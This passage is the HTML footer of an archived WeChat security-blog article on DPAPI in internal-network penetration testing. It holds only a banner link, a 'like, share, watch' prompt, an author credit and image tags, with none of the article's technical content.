normal;background-color: rgb(255, 255, 255);"><a target="_blank" href="http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247495879&amp;idx=1&amp;sn=ab05215b31822bee4461255e9fac3237&amp;chksm=ec1ca5f8db6b2cee91b02eb6a70e5ed979c6e46ef40b548f8467affed9bc9de476854bc5a41a&amp;scene=21#wechat_redirect" textvalue="你已选中了添加链接的内容" data-itemshowtype="0" tab="innerlink" data-linktype="1" hasload="1" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);cursor: pointer;"><span class="js_jump_icon h5_image_link" data-positionback="static" style="line-height: 0;inset: auto;"><img class="rich_pages" data-ratio="0.4255555555555556" data-s="300,640" data-type="png" data-w="900" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/6_1icJc9VoX8KbdFsB6plzmBCTjGDibQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibHHibNbEpsAMia19jkGuuz9tTIfiauo7fjdWicOTGhPibiat3Kt90m1icJc9VoX8KbdFsB6plzmBCTjGDibQ/640?wx_fmt=png'" style="border-width: 0px;border-style: initial;border-color: initial;border-radius: 30px;box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></span></a></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center; color: rgb(163, 163, 163) !important;" class="js_darkmode__14" data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-darkmode-color-16121018536955="rgb(163, 163, 163)" data-darkmode-original-color-16121018536955="#fff|rgb(163, 163, 163)" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><br  /></p><p data-darkmode-bgcolor-16121018536955="rgb(25, 25, 25)" data-darkmode-original-bgcolor-16121018536955="#fff|rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" class="js_darkmode__15" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="font-size:18px;line-height:38px;;color: rgb(255, 104, 39);"><strong>点赞，转发，在看</strong></span></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><br  /></p><p data-darkmode-bgcolor-15976329806349="rgb(25, 25, 25)" data-darkmode-original-bgcolor-15976329806349="rgb(255, 255, 255)" data-style="font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif; letter-spacing: 0.544px; white-space: normal; background-color: rgb(255, 255, 255); text-align: center;" style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);text-align: right;"><span style="font-size:12px;line-height:32px;;">原创投稿作者：HopeVenus</span></p><p style="font family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;white-space: normal;background-color: rgb(255, 255, 255);"><img class="rich_pages __bg_gif" data-ratio="0.5197505197505198" data-type="gif" data-w="962" src="图片/HACK学习呀_2021-04-29_内网渗透DPAPI机制学习/7_EedaMZeibI6cKE55jiaLMf9APuY0pA.gif" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif'" style="box-sizing: border-box !important;visibility: visible !important;width: 677px !important;"  /></p>
                </div>
</div>
</body>
</html>